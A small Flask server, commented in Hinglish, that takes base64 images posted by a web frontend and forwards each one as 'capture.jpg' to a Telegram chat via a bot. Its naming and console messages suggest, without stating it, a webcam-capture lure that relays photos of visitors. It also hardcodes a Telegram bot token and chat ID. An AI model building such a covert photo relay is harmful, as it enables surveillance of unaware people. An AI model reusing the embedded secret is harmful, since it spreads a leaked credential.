from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import base64
import io

app = Flask(__name__)
CORS(app)

# ==== Aapka Token yahan daal diya hai ====
BOT_TOKEN = '8133726121:AAFlhLPmzb321E4p6jP7Vut1XVgfz6DMR6k'

# ==== Apna Chat ID yahan daalein ====
# (Browser mein 'https://api.telegram.org/bot<TOKEN>/getUpdates' se milega)
CHAT_ID = '6818281254' 

@app.route('/send-photo', methods=['POST'])
def send_photo():
    try:
        # Frontend se Base64 image data lena
        data = request.get_json()
        image_data = data['image'] 
        
        # Base64 string ko saaf karna
        header, base64_str = image_data.split(',', 1)
        
        # String ko image bytes mein convert karna
        image_bytes = base64.b64decode(base64_str)
        
        # Bytes ko file ki tarah taiyaar karna
        image_file = io.BytesIO(image_bytes)
        image_file.name = 'capture.jpg'

        # Telegram API ko call karna
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        payload = {
            'chat_id': CHAT_ID
        }
        files = {
            'photo': image_file
        }

        # Request bhejna
        response = requests.post(url, data=payload, files=files)
        
        if response.status_code == 200:
            print("OH my god i see the most beautiful person in the world")
            return jsonify({'success': True, 'message': 'Photo sent!'})
        else:
            print("Error:", response.json())
            return jsonify({'success': False, 'message': 'Failed to capture because its more breautiful in every second'}), 500

    except Exception as e:
        print(f"Server par error: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500

if __name__ == '__main__':
    # Server port 5000 par chalega
    app.run(host='0.0.0.0', port=10000)
